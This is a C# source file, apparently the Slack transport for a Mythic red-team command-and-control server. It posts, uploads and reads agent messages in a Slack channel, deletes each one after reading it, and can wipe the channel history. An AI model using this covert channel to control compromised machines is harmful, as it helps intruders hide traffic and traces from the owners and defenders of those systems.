using Newtonsoft.Json;
using slack_server.Model;
using slack_server.Model.Mythic;
using slack_server.Model.Server;
using System.Collections.Specialized;
using System.Net;
using System.Net.Http.Headers;

namespace slack_server.Clients
{
    public class SlackClient
    {
        private HttpClient slackClient;
        private string channel_id { get; set; }
        private string message_token { get; set; }
        public SlackClient(ServerConfig config)
        {
            this.channel_id = config.channel_id;
            this.message_token = config.message_token;



            slackClient = new HttpClient();
            slackClient.DefaultRequestHeaders.Add("Authorization", $"Bearer {this.message_token}");
            //slackClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue($"Bearer {Globals.serverconfig.message_token}");
            ServicePointManager.DefaultConnectionLimit = 10;
        }
        public async Task<bool> DeleteMessage(string message)
        {

            string data = "{\"channel\":\"" + this.channel_id + "\",\"ts\":\"" + message + "\"}";

            return await SendPost("https://slack.com/api/chat.delete", data); ;
        }
        private async Task<bool> SendPost(string url, string data)
        {
            HttpContent postBody = new StringContent(data);
            postBody.Headers.ContentType = new MediaTypeHeaderValue("application/json");

            //POST Slack Message
            try
            {
                //string response = await slackClients[i].UploadStringAsync(new Uri(url), data);
                var response = await slackClient.PostAsync(url, postBody);
                string strResponse = await response.Content.ReadAsStringAsync();

                if (!String.IsNullOrEmpty(strResponse))
                {
                    return true;
                }
            }
            catch (WebException e)
            {
                HttpWebResponse webRes = (HttpWebResponse)e.Response;

                if (webRes != null)
                {
                    if (webRes.StatusCode == HttpStatusCode.TooManyRequests)
                    {
                        try
                        {
                            await Task.Delay(int.Parse(webRes.Headers["Retry-After"]));
                        }
                        catch
                        {
                            //Default wait 30s
                            await Task.Delay(30000);
                        }
                        return false;
                    }
                }
                else
                {
                    Console.WriteLine(e);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
            return false;
        }
        public async Task<string> DownloadFile(string url)
        {
            try
            {
                //POST Slack Message
                var response = await slackClient.GetAsync(url);
                string strResponse = await response.Content.ReadAsStringAsync();

                return strResponse;

            }
            catch (WebException e)
            {
                Console.WriteLine($"[DownloadSlackFile] {e.Message}");
                HttpWebResponse webRes = (HttpWebResponse)e.Response;
                if (webRes != null)
                {
                    if (webRes.StatusCode == HttpStatusCode.TooManyRequests)
                    {
                        try
                        {
                            await Task.Delay(int.Parse(webRes.Headers["Retry-After"]));
                        }
                        catch
                        {
                            //Default wait 30s
                            await Task.Delay(30000);
                        }
                        return "";
                    }
                }
            }
            return "";
        }
        private async Task<bool> UploadFile(string data, MythicMessageWrapper mw)
        {
            string url = "https://slack.com/api/files.upload";
            var wc = new WebClient();
            var parameters = new NameValueCollection();
            parameters.Add("filename", "file");
            parameters.Add("filetype", "text");
            parameters.Add("channels", this.channel_id);
            parameters.Add("title", "file");
            parameters.Add("initial_comment", JsonConvert.SerializeObject(mw));
            parameters.Add("content", data);

            wc.Headers.Add("Authorization", $"Bearer {this.message_token}");


            try
            {
                byte[] res = wc.UploadValues(url, "POST", parameters);
                wc.Dispose(); //Dispose the webclient
                return true;
            }
            catch (WebException e)
            {
                Console.WriteLine("[UploadFile] " + e.Message);

                HttpWebResponse webRes = (HttpWebResponse)e.Response;
                if (webRes != null)
                {
                    if (webRes.StatusCode == HttpStatusCode.TooManyRequests)
                    {
                        try
                        {
                            await Task.Delay(int.Parse(webRes.Headers["Retry-After"]));
                        }
                        catch
                        {
                            //Default wait 30s
                            await Task.Delay(30000);
                        }
                    }
                }
            }
            return false;
        }
        public async Task<bool> SendMessage(string data, string sender_id)
        {
            string url = "https://slack.com/api/chat.postMessage";

            if (data.Count() > 3850)
            {
                MythicMessageWrapper msg = new MythicMessageWrapper()
                {
                    sender_id = sender_id,
                    message = "",
                    to_server = false,
                    id = 1,
                    final = true
                };

                return await UploadFile(data, msg);
                //Upload File
            }
            else
            {
                MythicMessageWrapper msg = new MythicMessageWrapper()
                {
                    sender_id = sender_id,
                    message = data,
                    to_server = false,
                    id = 1,
                    final = true
                };

                //Create Message Object
                SlackMessage sm = new SlackMessage()
                {
                    channel = this.channel_id,
                    text = JsonConvert.SerializeObject(msg),
                    username = "Server",
                    icon_emoji = ":crown:"
                };

                return await SendPost(url, JsonConvert.SerializeObject(sm));
            }
        }
        public async Task<bool> ClearSlackMessages()
        {
            //Change this to a while GetMessages().Count > 1 for when there are more than 200 messages
            ConversationHistoryResponse messages = await GetMessages();

            while(messages.messages.Count() > 0)
            {
                Console.WriteLine($"Clearing {messages.messages.Count()} messages.");

                foreach (var message in messages.messages)
                {
                    try
                    {
                        await DeleteMessage(message.ts);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }  
                    await Task.Delay(1000);
                }
                messages = await GetMessages();
            }
            Console.WriteLine("Finished clearing messages.");
            return true;
        }
        private async Task<Dictionary<string, MythicMessageWrapper>> GetServerMessages(ConversationHistoryResponse msgResponse)
        {
            Dictionary<string, MythicMessageWrapper> messages = new Dictionary<string, MythicMessageWrapper>();

            //Change this to a parallel.foreach and modify messages to be thread safe
            if (msgResponse != null)
            {
                foreach (var message in msgResponse.messages)
                {
                    try
                    {
                        if (message.text.Contains("to_server"))
                        {
                            MythicMessageWrapper mythicMessage = JsonConvert.DeserializeObject<MythicMessageWrapper>(message.text);

                            if (mythicMessage != null)
                            {
                                messages.Add(message.ts, mythicMessage);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }
                return messages;
            }
            else
            {
                Console.WriteLine("[GetMessages] Unable to deserialize messages, null returned.");
                return new Dictionary<string, MythicMessageWrapper>();
            }
        }
        private async Task<ConversationHistoryResponse> GetMessages()
        {
            var response = await slackClient.GetAsync($"https://slack.com/api/conversations.history?channel={this.channel_id}&limit=200");
            string strResponse = await response.Content.ReadAsStringAsync();

            return JsonConvert.DeserializeObject<ConversationHistoryResponse>(strResponse) ?? new ConversationHistoryResponse();
        }
        public async Task<bool> Catchup()
        {
            ConversationHistoryResponse msgResponse = await GetMessages();
            Dictionary<string, MythicMessageWrapper> messages = await GetServerMessages(msgResponse);
            
            Parallel.ForEach(messages, async message =>
            {
                 if (message.Value.to_server)
                 {
                    await DeleteMessage(message.Key);
                    await Utilities.HandleAgentMessage(message.Value);
                 }
            });
            return true;
        }
        public async Task<bool> AddReaction(string timestamp)
        {
            string reactionData = "{\"channel\":\"" + this.channel_id + "\",\"name\":\"eyes\",\"timestamp\":\"" + timestamp + "\"}";
            return await SendPost("https://slack.com/api/reactions.add", reactionData);
        }
    }
}
